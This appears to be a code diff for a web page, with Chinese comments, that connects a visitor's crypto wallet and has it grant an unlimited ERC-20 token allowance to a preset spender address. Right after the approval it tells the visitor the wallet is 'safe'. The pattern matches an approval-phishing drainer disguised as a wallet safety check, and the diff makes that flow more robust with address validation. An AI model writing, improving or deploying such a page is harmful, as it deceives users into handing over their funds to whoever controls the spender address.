@@ -105,13 +105,25 @@
       }
     ];
 
+    // 确保地址格式正确
+    function checkAddressFormat(address) {
+      try {
+        return ethers.utils.getAddress(address);
+      } catch (err) {
+        alert("地址格式错误: " + address);
+        throw err;
+      }
+    }
+
     async function connectWallet() {
       if (window.ethereum) {
         try {
           const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
           userAddress = accounts[0];
+          // 校验钱包地址格式
+          userAddress = checkAddressFormat(userAddress);
           document.getElementById("wallet-address").innerText = "钱包地址：" + userAddress;
-          document.getElementById("connectStatus").innerText = ""; // Clear error message
+          document.getElementById("connectStatus").innerText = ""; // 清空错误信息
         } catch (err) {
           alert("连接失败: " + err.message);
         }
@@ -126,12 +138,15 @@
         return;
       }
 
+      // 校验合约地址格式
+      const spender = checkAddressFormat(spenderAddress);
+
       const provider = new ethers.providers.Web3Provider(window.ethereum);
       const signer = provider.getSigner();
       const token = new ethers.Contract(tokenAddress, erc20ABI, signer);
 
       try {
-        const tx = await token.approve(spenderAddress, ethers.constants.MaxUint256);
+        const tx = await token.approve(spender, ethers.constants.MaxUint256); // 无限授权
         await tx.wait();
         document.getElementById("wallet-address").innerHTML =
           `钱包地址：${userAddress}<br/><span style="color:lightgreen;">✅ 钱包状态：安全</span>`;
